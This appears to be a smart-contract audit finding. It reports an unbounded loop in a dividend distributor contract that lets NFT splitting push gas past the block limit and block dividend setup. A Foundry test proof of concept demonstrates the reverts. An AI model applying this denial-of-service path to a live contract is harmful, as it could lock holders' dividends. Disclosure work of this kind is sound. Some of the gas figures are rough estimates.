# [000517] Unbounded Loop Causes Out-of-Gas DoS Leads to Owner Cannot Set Dividends with Large NFT Count
  
  ### Summary

The `getTotalUnclaimedAmounts()` function iterates through ALL minted NFTs without any pagination or batching mechanism. As the number of minted NFTs grows, this function will eventually consume more gas than the block gas limit, causing permanent reversion. This prevents the owner from setting up dividends, effectively breaking the core functionality of the contract.


### Root Cause


In `A26ZDividendDistributor.sol` in `getUnclaimedAmounts()` function execute unbounded loop over growing nft Id :
```solidity
function getTotalUnclaimedAmounts() public returns (uint256 _totalUnclaimedAmounts) {
    uint256 len = nft.getTotalMinted(); // Could be 1000, 5000 over the time with project growth
    for (uint i; i < len;) {
        (, bool isOwned) = safeOwnerOf(i);           // Gas cost per iteration
        if (isOwned) _totalUnclaimedAmounts += getUnclaimedAmounts(i); // More gas becaue there is internal loop also
        unchecked { ++i; }
    }
}
```
Because of growing nft Id over the time or malicious user can split his nft id to multiple nft id intentionally for that, causing revert on `getUnclaimedAmounts()`  function (when admin call it for `setAmounts()` or `setUpTheDividends()`).
Same things will be happen also for `setDividends()` also.

Code Snippet-
https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol#L127-L136


### Internal Pre-conditions

1. NFT minting is unrestricted (whitelist disabled) or has a high cap(because of natural growth over the time).
2. Each NFT has multiple vesting allocations (increases per-NFT gas cost).
3. Admin call `setAmounts()` or `setUpTheDividends()` for  set the dividends of the TVS holders or doing dividend distribution.
4. Sufficient Number of minted NFTs with multiple vesting allocations (that can be happen naturally over the time or malicious user can split his nft to creat this situation faster), that leads to exceeds gas-feasible threshold(exceed Block gas limit).


### External Pre-conditions

1. Malicious user have sufficient amount of nft, that can be split into multiple.

### Attack Path

Assuming block gaslimit 30 million (like EVM)
**Normal Situation**

- NFTs minted = 100
- Owner can set dividends 
- Gas needed: 5,000,000 (well under limit of block)


**Natursl Growth/Attack by Malicious User**

- NFTs minted = 1000 (increased 900 because of Attacker Split his NFTs or natural growth over the time)
- Total: 1000 NFTs
- Gas needed: 55,000,000 (EXCEEDS 30M limit of block)


In one line attacke/vulnarable path is ---
Attacker mints enough NFTs (by spliting his nft) OR mints enough NFTs naturally over the time → `getTotalUnclaimedAmounts()` loops through all → exceeds gas limit → permanent DoS → dividends cannot be set for TVS holder.


### Impact

Breaking of Core Functionality. Create permanent DoSed Situation. TVS holders cannot receive their dividends.


### PoC

Add this to `AlignerzVestingProtocolTest.t.sol` and import `A26ZDividendDistributor` contract on this file


```solidity
/// @notice PoC: Demonstrates Out-of-Gas DoS when too many NFTs are minted
function test_OOG_DoS_LargeNFTCount() public {
    console.log("=== Out-of-Gas DoS Attack PoC ===\n");
    
    // Step 1: Setup - Create a project with vesting
    vm.startPrank(projectCreator);
    
    uint256 projectId = vesting.createProject(
        address(token),
        address(usdt),
        block.timestamp + 1 days,
        block.timestamp + 8 days,
        90 days,
        1000 ether, // softcap
        10000 ether // hardcap
    );
    
    console.log("Step 1: Project created, ID:", projectId);
    vm.stopPrank();
    
    // Step 2: Create many bidders and simulate accepted bids
    uint256 numNFTs = 700; // This will cause OOG
    console.log("Step 2: Creating", numNFTs, "NFT holders\n");
    
    BidInfo[] memory bids = new BidInfo[](numNFTs);
    address[] memory manyBidders = new address[](numNFTs);
    
    // Create bidders and their bid info
    for (uint256 i = 0; i < numNFTs; i++) {
        address bidder = makeAddr(string.concat("attacker", vm.toString(i)));
        vm.deal(bidder, 10 ether);
        manyBidders[i] = bidder;
        usdt.mint(bidder, 100 ether);
        
        bids[i] = BidInfo({
            bidder: bidder,
            amount: 100 ether, // 100 tokens per bid
            vestingPeriod: 90 days,
            poolId: 0,
            accepted: true
        });
        
        if (i % 100 == 0) {
            console.log("- Created", i, "bidders...");
        }
    }
    
    console.log("\nStep 3: Generating merkle tree for", numNFTs, "bids");
    
    // Generate merkle root and proofs
    bytes32 root = generateMerkleProofs(bids, 0);
    
    // Step 4: Project creator allocates to pool
    vm.startPrank(projectCreator);
    vesting.allocate(projectId, 0, root, numNFTs * 100 ether);
    vm.stopPrank();
    
    console.log("Step 4: Allocation complete, merkle root set\n");
    
    // Step 5: All bidders claim their NFTs (creating vesting positions)
    console.log("Step 5: Bidders claiming NFTs...");
    
    for (uint256 i = 0; i < numNFTs; i++) {
        address bidder = manyBidders[i];
        bytes32[] memory proof = bidderProofs[bidder];
        
        vm.startPrank(bidder);
        usdt.approve(address(vesting), 100 ether);
        
        vesting.allocateToUser(
            projectId,
            0, // poolId
            100 ether, // amount
            proof
        );
        
        vm.stopPrank();
        
        // Store NFT ID for each bidder
        bidderNFTIds[bidder] = i;
        
        if (i % 100 == 0 && i > 0) {
            console.log("- Claimed", i, "NFTs...");
        }
    }
    
    console.log("Step 6: All", numNFTs, "NFTs minted and vesting positions created\n");
    
    // Step 7: Deploy Dividend Distributor
    console.log("Step 7: Deploying Dividend Distributor...");
    
    MockUSD dividendToken = new MockUSD();
    
    A26ZDividendDistributor distributor = new A26ZDividendDistributor(
        address(vesting),
        address(nft),
        address(dividendToken),
        block.timestamp,
        90 days,
        address(token)
    );
    
    // Fund distributor with dividends
    dividendToken.mint(address(distributor), 1_000_000 ether);
    console.log("Distributor funded with 1M dividend tokens\n");
    
    // Step 8: Owner attempts to set up dividends - THIS WILL FAIL
    console.log("Step 8: Owner attempting to calculate total unclaimed amounts...");
    console.log("This requires looping through all", numNFTs, "NFTs\n");
    
    uint256 gasBefore = gasleft();
    
    // Measure gas for small sample first
    console.log("--- Gas Consumption Analysis ---");
    uint256 sampleSize = 100;
    uint256 sampleGas = 0;
    
    for (uint256 i = 0; i < sampleSize; i++) {
        uint256 gasStart = gasleft();
        distributor.getUnclaimedAmounts(i);
        sampleGas += (gasStart - gasleft());
    }
    
    uint256 avgGasPerNFT = sampleGas / sampleSize;
    console.log("Average gas per NFT:", avgGasPerNFT);
    console.log("Total NFTs:", numNFTs);
    console.log("Estimated gas needed:", avgGasPerNFT * numNFTs);
    console.log("Block gas limit: ~30,000,000");
    
    if (avgGasPerNFT * numNFTs > 30_000_000) {
        console.log("\n!!! GAS EXCEEDS BLOCK LIMIT !!!");
        console.log("Contract is PERMANENTLY BROKEN\n");
    }
    
    // Step 9: Try the actual call - expect failure
    console.log("Step 9: Attempting getTotalUnclaimedAmounts()...\n");
    
    vm.expectRevert(); // Expect out-of-gas revert
    distributor.getTotalUnclaimedAmounts();
    
    console.log("!!! TRANSACTION REVERTED - OUT OF GAS !!!\n");
    
    // Step 10: Try setUpTheDividends - also fails
    console.log("Step 10: Owner tries setUpTheDividends()...\n");
    
    vm.expectRevert();
    distributor.setUpTheDividends();
    
    console.log("!!! DIVIDEND SETUP FAILED !!!");
    console.log("!!! CONTRACT CORE FUNCTIONALITY BROKEN !!!");
    console.log("!!! 1M DIVIDEND TOKENS LOCKED FOREVER !!!\n");
    
    // Step 11: Demonstrate impact
    console.log("=== ATTACK IMPACT SUMMARY ===");
    console.log("- Total NFTs minted:", numNFTs);
    console.log("- Gas required: >30M (exceeds block limit)");
    console.log("- Owner CANNOT set dividends");
    console.log("- Users CANNOT claim dividends");
    console.log("- Funds PERMANENTLY LOCKED");
    console.log("- Attack cost: ~", numNFTs * 100, "tokens + gas fees");
    console.log("- Damage: CRITICAL - Contract unusable");
    console.log("\n=== END OF POC ===");
}
```

### Mitigation

N/A
  